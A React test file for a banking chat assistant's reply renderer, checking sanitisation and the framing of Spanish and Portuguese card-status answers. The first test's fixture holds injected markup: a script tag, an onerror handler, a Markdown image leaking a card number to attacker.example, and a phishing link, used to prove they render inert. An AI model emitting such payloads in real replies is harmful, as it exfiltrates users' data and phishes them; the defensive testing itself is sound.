import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import { Reply } from "../../src/chat/reply";

// An injected reply can't make the browser fetch anything or run a script (ADR-0007, EVL-05).
test("renders raw HTML as text, drops images, and shows links without their address", () => {
  const { container } = render(
    <Reply
      text={[
        'Hola <script>alert("x")</script> y <img src="https://attacker.example/x" onerror="alert(1)">.',
        "",
        "![card](https://attacker.example/leak?d=4821)",
        "",
        "[Ver detalle](https://attacker.example/phish)",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("script")).toBeNull();
  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("a")).toBeNull();
  expect(container.querySelector("[href], [src], [onerror]")).toBeNull();
  expect(screen.getByText("Ver detalle")).toBeInTheDocument();
  expect(container.textContent).toContain("<script>");
  expect(container.textContent).not.toContain("attacker.example/phish");
});

test("renders the Markdown a reply uses: emphasis, lists, and tables", () => {
  const { container } = render(
    <Reply
      text={[
        "Sus **tarjetas**:",
        "",
        "- Crédito terminada en 4821",
        "- Débito terminada en 7730",
        "",
        "| Tarjeta | Estado |",
        "| --- | --- |",
        "| 4821 | Activa |",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("strong")).toHaveTextContent("tarjetas");
  expect(container.querySelectorAll("li")).toHaveLength(2);
  expect(container.querySelector("table")).toHaveTextContent("Activa");
  expect(container.querySelector("table")?.parentElement).toHaveClass(
    "overflow-x-auto",
  );
});

// A status answer as the agent's code writes it (formats.card_line, pinned in tests/banking_agent/agent/test_formats.py).
const STATUS_ANSWERS = {
  es: [
    "Estas son sus tarjetas y el estado de cada una:",
    "",
    "- Tarjeta de crédito terminada en 3843: activa; fecha de vencimiento: 03/2030",
    "- Tarjeta de débito terminada en 4337: bloqueada; fecha de vencimiento: no registrada",
  ].join("\n"),
  pt: [
    "Estes são os seus cartões e o status de cada um:",
    "",
    "- Cartão de crédito final 3843: ativo; validade: 03/2030",
    "- Cartão de débito final 4337: bloqueado; validade: não registrada",
  ].join("\n"),
};

function frames(container: HTMLElement): (string | null)[][] {
  return [...container.querySelectorAll("[data-cards] > li")].map((frame) =>
    [...frame.querySelectorAll("p")].map((line) => line.textContent),
  );
}

test.each([
  {
    language: "es" as const,
    expected: [
      [
        "Tarjeta de crédito terminada en 3843",
        "Activa",
        "Fecha de vencimiento: 03/2030",
      ],
      [
        "Tarjeta de débito terminada en 4337",
        "Bloqueada",
        "Fecha de vencimiento: no registrada",
      ],
    ],
  },
  {
    language: "pt" as const,
    expected: [
      ["Cartão de crédito final 3843", "Ativo", "Validade: 03/2030"],
      ["Cartão de débito final 4337", "Bloqueado", "Validade: não registrada"],
    ],
  },
])(
  "draws a status answer's cards in frames, after its sentence ($language)",
  ({ language, expected }) => {
    const { container } = render(<Reply text={STATUS_ANSWERS[language]} />);

    expect(frames(container)).toEqual(expected);
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(
      container.querySelector("[data-cards]")?.previousElementSibling,
    ).toHaveTextContent(STATUS_ANSWERS[language].split("\n")[0] ?? "");
  },
);

test.each([
  ["a line that isn't a card's", "- Algo más"],
  [
    "a card in the other language",
    "- Cartão de crédito final 3843: ativo; validade: 03/2030",
  ],
  [
    "a card in bold",
    "- **Tarjeta de crédito terminada en 1234: activa; fecha de vencimiento: 03/2030**",
  ],
])("keeps a list as a list when it holds %s", (_, line) => {
  const { container } = render(
    <Reply text={`${STATUS_ANSWERS.es}\n${line}`} />,
  );

  expect(container.querySelector("[data-cards]")).toBeNull();
  expect(container.querySelector("ul")).toHaveTextContent(
    "Tarjeta de crédito terminada en 3843: activa; fecha de vencimiento: 03/2030",
  );
});
